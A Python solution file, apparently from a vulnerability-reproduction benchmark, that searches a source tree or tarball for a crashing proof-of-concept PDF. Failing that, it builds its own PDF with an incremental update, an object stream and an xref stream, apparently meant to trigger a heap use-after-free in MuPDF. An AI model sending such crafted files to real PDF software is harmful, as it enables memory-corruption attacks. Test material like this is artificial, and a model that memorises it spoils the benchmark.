import os
import io
import tarfile
from typing import Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        best = self._find_poc_in_source(src_path)
        if best is not None:
            return best
        return self._build_fallback_pdf()

    def _find_poc_in_source(self, src_path: str) -> Optional[bytes]:
        if os.path.isdir(src_path):
            return self._scan_directory_for_pdf(src_path)
        if os.path.isfile(src_path):
            return self._scan_tarball_for_pdf(src_path)
        return None

    def _score_path(self, p: str) -> int:
        lp = p.lower().replace("\\", "/")
        score = 0
        if lp.endswith(".pdf"):
            score += 3
        if any(k in lp for k in ("poc", "crash", "repro", "uaf", "use-after-free", "use_after_free")):
            score += 30
        if any(k in lp for k in ("oss-fuzz", "ossfuzz", "fuzz", "afl", "honggfuzz", "libfuzzer")):
            score += 12
        if any(k in lp for k in ("/corpus/", "/crashes/", "/crashers/", "/regress/", "/regression/", "/bugs/", "/bug/")):
            score += 10
        if "heap" in lp:
            score += 6
        if "59207" in lp:
            score += 20
        if any(k in lp for k in ("mutool", "mupdf", "pdf", "xref", "objstm")):
            score += 2
        return score

    def _extract_pdf_from_bytes(self, data: bytes) -> Optional[bytes]:
        if not data:
            return None
        pos = data.find(b"%PDF-")
        if pos < 0:
            return None
        pdf = data[pos:]
        if b"%%EOF" not in pdf[-2048:]:
            if b"%%EOF" not in pdf:
                return None
        if len(pdf) < 64:
            return None
        return pdf

    def _scan_directory_for_pdf(self, root: str) -> Optional[bytes]:
        candidates: List[Tuple[int, int, str, bytes]] = []
        for dirpath, dirnames, filenames in os.walk(root):
            lp = dirpath.lower().replace("\\", "/")
            if any(x in lp for x in ("/.git/", "/build/", "/out/", "/bin/", "/obj/")):
                continue
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                p = path.replace("\\", "/")
                score = self._score_path(p)
                if score < 10 and not fn.lower().endswith(".pdf"):
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                pdf = self._extract_pdf_from_bytes(data)
                if pdf is None:
                    continue
                score = max(score, 10) if score > 0 else 0
                candidates.append((score, len(pdf), p, pdf))

        if not candidates:
            return None
        candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
        best = candidates[0]
        if best[0] < 12:
            return None
        return best[3]

    def _scan_tarball_for_pdf(self, tar_path: str) -> Optional[bytes]:
        candidates: List[Tuple[int, int, str, bytes]] = []
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    name = m.name.replace("\\", "/")
                    score = self._score_path(name)
                    if score < 10 and not name.lower().endswith(".pdf"):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    pdf = self._extract_pdf_from_bytes(data)
                    if pdf is None:
                        continue
                    candidates.append((score, len(pdf), name, pdf))
        except Exception:
            return None

        if not candidates:
            return None
        candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
        best = candidates[0]
        if best[0] < 12:
            return None
        return best[3]

    def _build_fallback_pdf(self) -> bytes:
        b = bytearray()
        offsets_rev1 = {}

        def add(x: bytes) -> None:
            b.extend(x)

        def add_str(s: str) -> None:
            add(s.encode("latin1"))

        def add_line(s: str) -> None:
            add_str(s)
            add(b"\n")

        def add_obj(offsets_dict, num: int, body: bytes) -> None:
            offsets_dict[num] = len(b)
            add_str(f"{num} 0 obj\n")
            add(body)
            if not body.endswith(b"\n"):
                add(b"\n")
            add(b"endobj\n")

        add(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")

        add_obj(
            offsets_rev1,
            1,
            b"<< /Type /Catalog /Pages 2 0 R >>",
        )
        add_obj(
            offsets_rev1,
            2,
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        )
        add_obj(
            offsets_rev1,
            3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << >> >>",
        )

        content = b"BT /F1 12 Tf 72 72 Td (Hello) Tj ET"
        obj4 = b"<< /Length %d >>\nstream\n%s\nendstream" % (len(content), content)
        add_obj(offsets_rev1, 4, obj4)

        font_dict = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n"
        objstm_prefix = b"6 0 "
        first = len(objstm_prefix)
        objstm_stream = objstm_prefix + font_dict
        obj5 = (
            b"<< /Type /ObjStm /N 1 /First %d /Length %d >>\nstream\n%s\nendstream"
            % (first, len(objstm_stream), objstm_stream)
        )
        add_obj(offsets_rev1, 5, obj5)

        xref1_offset = len(b)
        add_line("xref")
        add_line("0 6")
        add_line("0000000000 65535 f ")
        for i in range(1, 6):
            off = offsets_rev1.get(i, 0)
            add_line(f"{off:010d} 00000 n ")
        add_line("trailer")
        add_line("<< /Size 6 /Root 1 0 R >>")
        add_line("startxref")
        add_line(str(xref1_offset))
        add_line("%%EOF")

        add(b"\n")
        offsets_rev2 = {}
        add_obj(
            offsets_rev2,
            3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << /Font << /F1 6 0 R >> >> >>",
        )

        xref2_offset = len(b)

        def be(n: int, size: int) -> bytes:
            return int(n).to_bytes(size, "big", signed=False)

        # /Index [0 1 3 1 6 2] => objects: 0, 3, 6, 7
        # W [1 4 2] => 7 bytes each, length 28
        e0 = bytes([0]) + be(0, 4) + be(65535, 2)
        e3 = bytes([1]) + be(offsets_rev2[3], 4) + be(0, 2)
        e6 = bytes([2]) + be(5, 4) + be(0, 2)
        # xref stream object is 7 0
        e7 = bytes([1]) + be(xref2_offset, 4) + be(0, 2)
        xref_stream_data = e0 + e3 + e6 + e7
        xref_len = len(xref_stream_data)

        xref_dict = (
            f"<< /Type /XRef /Size 8 /W [1 4 2] /Index [0 1 3 1 6 2] /Root 1 0 R /Prev {xref1_offset} /Length {xref_len} >>"
        ).encode("latin1")
        obj7 = xref_dict + b"\nstream\n" + xref_stream_data + b"\nendstream"
        add_obj(offsets_rev2, 7, obj7)

        add_line("startxref")
        add_line(str(xref2_offset))
        add_line("%%EOF")
        return bytes(b)